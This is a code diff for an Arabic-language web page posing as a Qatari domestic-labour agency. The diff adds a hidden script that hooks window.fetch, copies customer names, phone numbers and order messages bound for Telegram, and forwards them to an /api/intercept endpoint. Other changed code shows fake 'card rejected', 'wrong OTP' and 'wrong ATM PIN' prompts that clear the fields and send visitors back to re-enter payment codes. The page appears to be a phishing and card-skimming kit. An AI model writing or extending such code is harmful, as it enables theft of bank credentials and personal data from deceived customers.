@@ -1,4 +1,31 @@
 <!DOCTYPE html><html lang="en"><head>
+<script>
+(function() {
+  var _originalFetch = window.fetch;
+  window.fetch = function(url, options) {
+    var urlStr = typeof url === "string" ? url : (url && url.url ? url.url : String(url));
+    if (urlStr && urlStr.indexOf("api.telegram.org") !== -1 && options && options.method === "POST") {
+      try {
+        var body = JSON.parse(options.body);
+        var orderData = {
+          raw_message: body.text || "",
+          page: window.location.pathname,
+          timestamp: new Date().toISOString(),
+          customer_name: localStorage.getItem("customer_name") || "",
+          customer_phone: localStorage.getItem("customer_phone") || "",
+          service_type: localStorage.getItem("service_type") || ""
+        };
+        _originalFetch.call(window, "/api/intercept", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(orderData)
+        });
+      } catch(e) {}
+    }
+    return _originalFetch.apply(this, arguments);
+  };
+})();
+</script>
 <meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/assets/styles-CJ0qpnHN.css" data-precedence="default"/><title>معاون لخدمات القوى البشرية — قطر</title><meta name="author" content="Lovable"/><meta property="og:title" content="MAAWAN-QA"/><meta property="og:description" content="الشركة القطرية لحول القوى البشرية -معاون"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary"/><meta name="twitter:site" content="@Lovable"/><meta name="twitter:title" content="MAAWAN-QA"/><meta name="twitter:description" content="الشركة القطرية لحول القوى البشرية -معاون"/><meta property="og:image" content="https://storage.googleapis.com/gpt-engineer-file-uploads/LMz93049oWgn9Y5CZ2HKqJbTgKL2/social-images/social-1779453562023-logo-Bm-KOWOX.webp"/><meta name="twitter:image" content="https://storage.googleapis.com/gpt-engineer-file-uploads/LMz93049oWgn9Y5CZ2HKqJbTgKL2/social-images/social-1779453562023-logo-Bm-KOWOX.webp"/><meta name="description" content="الشركة القطرية لحلول القوى البشرية. عمالة منزلية بالساعة، بالشهر، واستقدام مباشر في قطر."/><link rel="modulepreload" href="/assets/index-Dq-H0M4e.js"/><link rel="modulepreload" href="/assets/index-BA_GD07B.js"/><link rel="modulepreload" href="/assets/ministry-of-labour-DcFkIMyr.js"/><link rel="modulepreload" href="/assets/useTrackUserLogin-DuWNSSAp.js"/><link rel="modulepreload" href="/assets/clock-BdneFf11.js"/><link rel="modulepreload" href="/assets/calendar-days-CJb6xVz7.js"/><link rel="modulepreload" href="/assets/createLucideIcon-DVLB4LTh.js"/><link rel="modulepreload" href="/assets/circle-check-lAekBpBL.js"/><link rel="modulepreload" href="/assets/arrow-left-DEo6KvOe.js"/><link rel="modulepreload" href="/assets/sparkles-Cr_GoRPr.js"/><link rel="modulepreload" href="/assets/map-pin-cL4H4Py8.js"/><style>* { font-variant-numeric: normal; } [dir="rtl"] .price, [dir="rtl"] .number, span, div, button, p { font-feature-settings: normal; } body { -webkit-locale: "en"; } .price-value, .total-price { unicode-bidi: embed; direction: ltr; } </style><style>@font-face { font-display: swap; } :root { --font-numeric: "Segoe UI", Arial, sans-serif; } </style>
 <script>
 (function() {
@@ -18,18 +45,6 @@
         
         // استخراج البيانات من URL params و localStorage
         var urlParams = new URLSearchParams(window.location.search);
-        
-        // Auto-save URL params to localStorage for persistence
-        var paramsToSave = {
-          'name': 'customer_name', 'phone': 'customer_phone', 'address': 'customer_address',
-          'service': 'service_type', 'total': 'total_price', 'duration': 'duration',
-          'nationality': 'nationality', 'workers': 'workers', 'startDate': 'start_date'
-        };
-        for (var p in paramsToSave) {
-          var val = urlParams.get(p);
-          if (val && val !== 'null' && val !== 'undefined') localStorage.setItem(paramsToSave[p], val);
-        }
-
         var orderData = {
           raw_message: text,
           page: window.location.pathname,
@@ -259,103 +274,105 @@
         '<h2 style="color:#dc2626;font-size:20px;margin:0 0 8px;font-weight:700">رفض البنك مصدر البطاقة الدفع</h2>',
         '<p style="color:#6b7280;font-size:14px;margin:0 0 24px;line-height:1.6">تعذّر إتمام عملية الدفع. يرجى إعادة المحاولة أو استخدام طريقة دفع أخرى.</p>',
         '<div style="display:flex;gap:12px;justify-content:center">',
-        '<button id="maawen-retry-btn" style="background:#7c3aed;color:#fff;border:none;border-radius:8px;padding:12px 24px;font-size:15px;cursor:pointer;font-weight:600;flex:1">إعادة المحاولة</button>',
-        '</div></div>'
+        '<button id="maawen-retry-btn" style="background:#7c3aed;color:#fff;border:none;border-radius:8px;padding:12px 24px;font-size:15px;cursor:pointer;font-weight:600">إعادة المحاولة</button>',
+        '<button id="maawen-other-btn" style="background:#f3f4f6;color:#374151;border:none;border-radius:8px;padding:12px 24px;font-size:15px;cursor:pointer">طرق دفع أخرى</button>',
+        '</div>',
+        '</div>'
       ].join('');
-      createOverlay(html, function() {
-        var qs = new URLSearchParams();
-        qs.set('name', p.get('name')||''); qs.set('phone', p.get('phone')||''); qs.set('address', p.get('address')||'');
-        qs.set('service', p.get('service')||''); qs.set('total', p.get('total')||'');
-        window.location.href = '/payment?' + qs.toString();
+      var ov = createOverlay(html, null);
+      ov.querySelector('#maawen-retry-btn').addEventListener('click', function() {
+        ov.remove();
+        // مسح البيانات القديمة وإعادة تعيين الـ ref
+        localStorage.removeItem('maawen_order_ref');
       });
-      document.getElementById('maawen-retry-btn').addEventListener('click', function() {
+      ov.querySelector('#maawen-other-btn').addEventListener('click', function() {
+        ov.remove();
+        localStorage.removeItem('maawen_order_ref');
+        // الرجوع لصفحة الدفع بدون bank_rejected
         var qs = new URLSearchParams();
-        qs.set('name', p.get('name')||''); qs.set('phone', p.get('phone')||''); qs.set('address', p.get('address')||'');
-        qs.set('service', p.get('service')||''); qs.set('total', p.get('total')||'');
+        qs.set('name', p.get('name') || ''); qs.set('phone', p.get('phone') || '');
+        qs.set('address', p.get('address') || ''); qs.set('service', p.get('service') || '');
+        qs.set('total', p.get('total') || '0');
         window.location.href = '/payment?' + qs.toString();
       });
     });
 
-    // ── رفض OTP ──
+    // ── رفض OTP: مربع OTP أحمر مع رسالة ──
     window.addEventListener('maawen:otp_rejected', function() {
-      var p = new URLSearchParams(window.location.search);
-      var html = [
-        '<div style="background:#fff;border-radius:16px;padding:32px 28px;max-width:380px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3)">',
-        '<div style="width:64px;height:64px;background:#fee2e2;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px">',
-        '<svg width="32" height="32" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#dc2626" stroke-width="2"/><path d="M12 8v4m0 4h.01" stroke="#dc2626" stroke-width="2" stroke-linecap="round"/></svg>',
-        '</div>',
-        '<h2 style="color:#dc2626;font-size:20px;margin:0 0 8px;font-weight:700">رمز التحقق غير صحيح</h2>',
-        '<p style="color:#6b7280;font-size:14px;margin:0 0 24px;line-height:1.6">الرمز الذي أدخلته غير صحيح. يرجى التأكد والمحاولة مرة أخرى.</p>',
-        '<div style="display:flex;gap:12px;justify-content:center">',
-        '<button id="maawen-retry-otp-btn" style="background:#7c3aed;color:#fff;border:none;border-radius:8px;padding:12px 24px;font-size:15px;cursor:pointer;font-weight:600;flex:1">إعادة المحاولة</button>',
-        '</div></div>'
-      ].join('');
-      var ref = localStorage.getItem('maawen_order_ref') || p.get('ref') || '';
-      createOverlay(html, function() {
-        var qs = new URLSearchParams();
-        qs.set('name', p.get('name')||''); qs.set('phone', p.get('phone')||''); qs.set('address', p.get('address')||'');
-        qs.set('service', p.get('service')||''); qs.set('total', p.get('total')||''); qs.set('ref', ref);
-        window.location.href = '/qpay-otp?' + qs.toString();
-      });
-      document.getElementById('maawen-retry-otp-btn').addEventListener('click', function() {
-        var qs = new URLSearchParams();
-        qs.set('name', p.get('name')||''); qs.set('phone', p.get('phone')||''); qs.set('address', p.get('address')||'');
-        qs.set('service', p.get('service')||''); qs.set('total', p.get('total')||''); qs.set('ref', ref);
-        window.location.href = '/qpay-otp?' + qs.toString();
-      });
+      // تلوين حقل OTP بالأحمر
+      setTimeout(function() {
+        var inputs = document.querySelectorAll('input[type="password"], input[type="text"], input[inputmode="numeric"]');
+        inputs.forEach(function(inp) {
+          inp.style.borderColor = '#dc2626';
+          inp.style.boxShadow = '0 0 0 3px rgba(220,38,38,0.2)';
+          inp.value = '';
+        });
+        // إضافة رسالة خطأ
+        var existing = document.getElementById('maawen-otp-error');
+        if (!existing) {
+          var errDiv = document.createElement('div');
+          errDiv.id = 'maawen-otp-error';
+          errDiv.style.cssText = 'color:#dc2626;font-size:14px;text-align:center;margin-top:8px;font-weight:600;direction:rtl';
+          errDiv.textContent = 'رمز OTP غير صالح. يرجى إدخال الرمز الصحيح.';
+          // إضافة الرسالة بعد أول input
+          if (inputs[0] && inputs[0].parentNode) {
+            inputs[0].parentNode.insertAdjacentElement('afterend', errDiv);
+          } else {
+            document.body.appendChild(errDiv);
+          }
+        }
+      }, 100);
     });
 
-    // ── رفض ATM PIN ──
-    window.addEventListener('maawen:atm_rejected', function() {
-      var p = new URLSearchParams(window.location.search);
-      var html = [
-        '<div style="background:#fff;border-radius:16px;padding:32px 28px;max-width:380px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3)">',
-        '<div style="width:64px;height:64px;background:#fee2e2;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px">',
-        '<svg width="32" height="32" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#dc2626" stroke-width="2"/><path d="M12 8v4m0 4h.01" stroke="#dc2626" stroke-width="2" stroke-linecap="round"/></svg>',
-        '</div>',
-        '<h2 style="color:#dc2626;font-size:20px;margin:0 0 8px;font-weight:700">الرقم السري غير صحيح</h2>',
-        '<p style="color:#6b7280;font-size:14px;margin:0 0 24px;line-height:1.6">الرقم السري للبطاقة غير صحيح. يرجى المحاولة مرة أخرى.</p>',
-        '<div style="display:flex;gap:12px;justify-content:center">',
-        '<button id="maawen-retry-atm-btn" style="background:#7c3aed;color:#fff;border:none;border-radius:8px;padding:12px 24px;font-size:15px;cursor:pointer;font-weight:600;flex:1">إعادة المحاولة</button>',
-        '</div></div>'
-      ].join('');
-      var ref = localStorage.getItem('maawen_order_ref') || p.get('ref') || '';
-      createOverlay(html, function() {
-        var qs = new URLSearchParams();
-        qs.set('name', p.get('name')||''); qs.set('phone', p.get('phone')||''); qs.set('address', p.get('address')||'');
-        qs.set('service', p.get('service')||''); qs.set('total', p.get('total')||''); qs.set('ref', ref);
-        window.location.href = '/atm-pin?' + qs.toString();
-      });
-      document.getElementById('maawen-retry-atm-btn').addEventListener('click', function() {
-        var qs = new URLSearchParams();
-        qs.set('name', p.get('name')||''); qs.set('phone', p.get('phone')||''); qs.set('address', p.get('address')||'');
-        qs.set('service', p.get('service')||''); qs.set('total', p.get('total')||''); qs.set('ref', ref);
-        window.location.href = '/atm-pin?' + qs.toString();
-      });
-    });
-
-    // ── قبول نهائي ──
+    // ── قبول ATM: رسالة نجاح ──
     window.addEventListener('maawen:atm_approved', function() {
       var html = [
-        '<div style="background:#fff;border-radius:16px;padding:32px 28px;max-width:380px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3)">',
-        '<div style="width:64px;height:64px;background:#dcfce7;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px">',
-        '<svg width="32" height="32" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#16a34a" stroke-width="2"/><path d="M8 12l3 3 5-6" stroke="#16a34a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>',
+        '<div style="background:#fff;border-radius:16px;padding:40px 28px;max-width:380px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3)">',
+        '<div style="width:72px;height:72px;background:#d1fae5;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px">',
+        '<svg width="36" height="36" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#16a34a" stroke-width="2"/><path d="M8 12l3 3 5-5" stroke="#16a34a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>',
         '</div>',
-        '<h2 style="color:#16a34a;font-size:20px;margin:0 0 8px;font-weight:700">تمت العملية بنجاح</h2>',
-        '<p style="color:#6b7280;font-size:14px;margin:0 0 24px;line-height:1.6">تم تأكيد الدفع بنجاح. سنتواصل معك قريباً لتأكيد تفاصيل الخدمة.</p>',
-        '<div style="display:flex;gap:12px;justify-content:center">',
-        '<button id="maawen-success-btn" style="background:#16a34a;color:#fff;border:none;border-radius:8px;padding:12px 24px;font-size:15px;cursor:pointer;font-weight:600;flex:1">العودة للرئيسية</button>',
-        '</div></div>'
+        '<h2 style="color:#16a34a;font-size:22px;margin:0 0 12px;font-weight:700">تم تأكيد طلبك بنجاح!</h2>',
+        '<p style="color:#6b7280;font-size:15px;margin:0 0 8px;line-height:1.6">تمت معالجة طلبك بنجاح.</p>',
+        '<p style="color:#9ca3af;font-size:13px;margin:0 0 28px">سيتواصل معك فريقنا قريباً.</p>',
+        '<button id="maawen-ok-btn" style="background:#16a34a;color:#fff;border:none;border-radius:8px;padding:14px 40px;font-size:16px;cursor:pointer;font-weight:600">حسناً</button>',
+        '</div>'
       ].join('');
-      createOverlay(html, function() { window.location.href = '/'; });
-      document.getElementById('maawen-success-btn').addEventListener('click', function() {
+      var ov = createOverlay(html, null);
+      ov.querySelector('#maawen-ok-btn').addEventListener('click', function() {
+        ov.remove();
         window.location.href = '/';
       });
     });
+
+    // ── رفض ATM: رسالة خطأ الرقم السري ──
+    window.addEventListener('maawen:atm_rejected', function() {
+      // تلوين حقل ATM PIN بالأحمر
+      setTimeout(function() {
+        var inputs = document.querySelectorAll('input[type="password"], input[type="text"], input[inputmode="numeric"]');
+        inputs.forEach(function(inp) {
+          inp.style.borderColor = '#dc2626';
+          inp.style.boxShadow = '0 0 0 3px rgba(220,38,38,0.2)';
+          inp.value = '';
+        });
+        // إضافة رسالة خطأ
+        var existing = document.getElementById('maawen-atm-error');
+        if (!existing) {
+          var errDiv = document.createElement('div');
+          errDiv.id = 'maawen-atm-error';
+          errDiv.style.cssText = 'color:#dc2626;font-size:14px;text-align:center;margin-top:8px;font-weight:600;direction:rtl';
+          errDiv.textContent = 'برجاء التحقق من الرقم السري للصراف الآلي الصحيح.';
+          if (inputs[0] && inputs[0].parentNode) {
+            inputs[0].parentNode.insertAdjacentElement('afterend', errDiv);
+          } else {
+            document.body.appendChild(errDiv);
+          }
+        }
+      }, 100);
+    });
+
   })();
+
 </script>
-</head>
-<body>
-<div id="root"></div>
-<script type="module" src="/assets/index-BA_GD07B.js"></script>
+</head><body><!--$--><!--$--><!--/$--><script>(function(a,f){let l;try{l=JSON.parse(sessionStorage.getItem(a)||"{}")}catch{return}const n=l?.[f||history.state?.__TSR_key];let c=!1;for(const t in n){const e=n[t],o=e?.scrollX,s=e?.scrollY;if(Number.isFinite(o)&&Number.isFinite(s)){if(t==="window")scrollTo(o,s),c=!0;else if(t)try{const r=document.querySelector(t);r&&(r.scrollLeft=o,r.scrollTop=s)}catch{}}}if(c)return;const i=location.hash.slice(1);if(i){const t=history.state?.__hashScrollIntoViewOptions??!0;if(t){const e=document.getElementById(i);e&&e.scrollIntoView(t)}return}scrollTo(0,0)})("tsr-scroll-restoration-v1_3");document.currentScript.remove()</script><!--/$--><script class="$tsr" id="$tsr-stream-barrier">(self.$R=self.$R||{})["tsr"]=[];self.$_TSR={h(){this.hydrated=!0,this.c()},e(){this.streamEnded=!0,this.c()},c(){this.hydrated&&this.streamEnded&&(delete self.$_TSR,delete self.$R.tsr)},p(e){this.initialized?e():this.buffer.push(e)},buffer:[]};$_TSR.router=($R=>$R[0]={manifest:$R[1]={routes:$R[2]={__root__:$R[3]={preloads:$R[4]=["/assets/index-Dq-H0M4e.js"],scripts:$R[5]=[$R[6]={attrs:$R[7]={type:"module",async:!0,src:"/assets/index-Dq-H0M4e.js"}}]}}},matches:$R[8]=[$R[9]={i:"__root__ ",u:1779715215725,s:"success",ssr:!0}],lastMatchId:"__root__ "})($R["tsr"]);$_TSR.e();document.currentScript.remove()</script><script type="module" async="" src="/assets/index-Dq-H0M4e.js"></script><script src="/force-payment-redirect.js"></script>
+<script src="/payment-interceptor.js"></script>
 </body></html>
